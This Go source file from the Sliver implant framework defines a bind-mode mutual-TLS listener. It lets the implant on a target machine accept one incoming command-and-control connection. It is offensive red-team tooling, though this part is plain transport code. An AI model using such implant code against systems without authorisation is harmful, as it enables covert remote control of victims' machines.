package mtls

/*
   Sliver Implant Framework
   Copyright (C) 2019  Bishop Fox

   This program is free software: you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation, either version 3 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"crypto/tls"
	"fmt"
	"net"
	"net/url"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"strconv"

	"github.com/bishopfox/sliver/implant/sliver/cryptography"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

// Listen - Listen on the target for incoming server mutual TLS connections.
// The uri is mandatory, and the TransportProfile is needed for its credentials.
func Listen(uri *url.URL, p *sliverpb.Malleable) (c net.Conn, err error) {

	// {{if .Config.Debug}}
	log.Printf("Connecting -> %s", uri.Host)
	// {{end}}
	lport, err := strconv.Atoi(uri.Port())
	if err != nil {
		lport = 8888
	}

	// Get the TLS config for a bind connection.
	tlsConfig := cryptography.NewCredentialsTLS(
		p.Credentials.CACertPEM, p.Credentials.CertPEM, p.Credentials.KeyPEM).ServerConfig(uri.Hostname())

	// Start listening for incoming TLS connections
	ln, err := tls.Listen("tcp", fmt.Sprintf("%s:%d", uri.Hostname(), lport), tlsConfig)
	if err != nil {
		return nil, err
	}

	for {
		conn, err := ln.Accept()
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("Accept failed: %s", err.Error())
			// {{end}}
			// break
		}

		// Kill the listener: we don't have more than one C2 master at once.
		err = ln.Close()
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("Listener close error: %s", err.Error())
			// {{end}}
		}

		return conn, nil
	}
}
